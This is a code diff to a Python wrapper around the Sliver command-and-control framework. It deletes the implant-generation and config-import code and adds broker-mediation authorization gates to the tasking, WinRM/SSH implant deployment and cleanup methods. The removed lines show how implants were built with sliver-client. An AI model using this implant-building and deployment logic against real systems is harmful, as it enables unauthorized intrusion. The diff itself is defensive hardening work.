@@ -89,64 +89,48 @@ class SliverBackend:
             return []
 
     async def _import_config(self):
-        try:
-            proc = await asyncio.create_subprocess_exec(
-                "/usr/local/bin/sliver-client", "import", "/sliver-config/operator.cfg",
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
-            await proc.wait()
-        except Exception:
-            pass
+        # AM-4-R2: legacy sliver-client import body DELETED (was
+        # create_subprocess_exec). Zero callers remain (generate_implant
+        # gutted). No execution path remains.
+        from orchestrator.auth import WeldNotAuthorized
+        raise WeldNotAuthorized(
+            "AM-4 W-08 R3.0-P11: sliver _import_config branch deleted; "
+            "all execution routes through the broker-gated capability."
+        )
 
     async def generate_implant(self, config: ImplantConfig) -> bytes:
-        await self._import_config()
-        safe_name = config.name.replace(" ", "_").replace("/", "_")
-        out_path = f"/sliver-config/{safe_name}"
-        listener_port = os.getenv("SLIVER_LISTENER_PORT", "31338")
-        cmds = (
-            f"generate --mtls sliver-server:{listener_port} "
-            f"--os {config.os} --arch {config.arch} "
-            f"--name {safe_name} --format {config.format} "
-            f"--save {out_path}\n"
-            f"exit\n"
+        # AM-4-R2 W-08 (R3.0-P11) internal-sink defense (§4): no alternate
+        # production bypass around the gated bridge entry. Fail-closed.
+        from orchestrator.auth import enforce_broker_mediation, WeldNotAuthorized
+        enforce_broker_mediation(
+            target="c2-sliver",
+            action_type="c2_build",
+            capability="c2.sliver_backend",
+            method="generate_implant",
+            impact_estimate=9.0,
+            path_id="R3.0-P11",
+            weld_ticket="W-08",
         )
-        try:
-            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
-                f.write(cmds)
-                script_path = f.name
-            env = os.environ.copy()
-            env["HOME"] = "/tmp"
-            proc = await asyncio.create_subprocess_exec(
-                "/usr/local/bin/sliver-client", "--rc", script_path,
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                env=env,
-            )
-            try:
-                await asyncio.wait_for(proc.wait(), timeout=360)
-            except asyncio.TimeoutError:
-                try:
-                    proc.kill()
-                except Exception:
-                    pass
-                return b""
-            finally:
-                try:
-                    os.unlink(script_path)
-                except Exception:
-                    pass
-            if os.path.exists(out_path):
-                with open(out_path, "rb") as f:
-                    data = f.read()
-                try:
-                    os.unlink(out_path)
-                except Exception:
-                    pass
-                return data
-        except Exception:
-            pass
-        return b""
+        # AM-4-R2: legacy sliver-client exec body DELETED (was
+        # create_subprocess_exec + script-file write/unlink). No execution
+        # path remains past the gate.
+        raise WeldNotAuthorized(
+            "AM-4 W-08 R3.0-P11: sliver generate_implant branch deleted; "
+            "all execution routes through the broker-gated capability."
+        )
 
     async def send_task(self, session_id: str, command: str) -> TaskResult:
+        # AM-4-R2 W-08 (R3.0-P11) internal-sink defense (§4). Fail-closed.
+        from orchestrator.auth import enforce_broker_mediation
+        enforce_broker_mediation(
+            target="c2-sliver",
+            action_type="c2_task",
+            capability="c2.sliver_backend",
+            method="send_task",
+            impact_estimate=9.0,
+            path_id="R3.0-P11",
+            weld_ticket="W-08",
+        )
         await self._ensure_client()
         if not self._available:
             return TaskResult(session_id=session_id, task_id="", output="", error="No C2 backend", completed=False)
@@ -184,6 +168,17 @@ class SliverBackend:
 
     async def deploy_implant_winrm(self, target: str, username: str, password: str,
                                      transport: str = "mtls", os_type: str = "windows") -> Optional[str]:
+        # AM-4-R2 W-08 (R3.0-P11) internal-sink defense (§4). Fail-closed.
+        from orchestrator.auth import enforce_broker_mediation
+        enforce_broker_mediation(
+            target=target,
+            action_type="c2_deploy",
+            capability="c2.sliver_backend",
+            method="deploy_implant_winrm",
+            impact_estimate=9.0,
+            path_id="R3.0-P11",
+            weld_ticket="W-08",
+        )
         cfg = ImplantConfig(os=os_type, arch="amd64", name=f"implant-{target.replace('.','-')}",
                             format="exe", transport=transport)
         implant_bytes = await self.generate_implant(cfg)
@@ -212,6 +207,17 @@ class SliverBackend:
 
     async def deploy_implant_ssh(self, target: str, username: str, password_or_key: str,
                                   transport: str = "mtls", os_type: str = "linux") -> Optional[str]:
+        # AM-4-R2 W-08 (R3.0-P11) internal-sink defense (§4). Fail-closed.
+        from orchestrator.auth import enforce_broker_mediation
+        enforce_broker_mediation(
+            target=target,
+            action_type="c2_deploy",
+            capability="c2.sliver_backend",
+            method="deploy_implant_ssh",
+            impact_estimate=9.0,
+            path_id="R3.0-P11",
+            weld_ticket="W-08",
+        )
         cfg = ImplantConfig(os=os_type, arch="amd64", name=f"implant-{target.replace('.','-')}",
                             format="exe", transport=transport)
         implant_bytes = await self.generate_implant(cfg)
@@ -237,6 +243,17 @@ class SliverBackend:
     async def cleanup_implant(self, target: str, username: str, password_or_key: str,
                                remote_path: str, os_type: str = "linux") -> bool:
         """Remove implant from remote system: kill process, delete binary, remove persistence."""
+        # AM-4-R2 W-08 (R3.0-P11) internal-sink defense (§4). Fail-closed.
+        from orchestrator.auth import enforce_broker_mediation
+        enforce_broker_mediation(
+            target=target,
+            action_type="c2_task",
+            capability="c2.sliver_backend",
+            method="cleanup_implant",
+            impact_estimate=9.0,
+            path_id="R3.0-P11",
+            weld_ticket="W-08",
+        )
         if os_type == "windows":
             ps_cmd = (
                 f"Stop-Process -Name $(Get-Process | Where-Object {{$_.Path -eq '{remote_path}'}}) -Force -ErrorAction SilentlyContinue; "
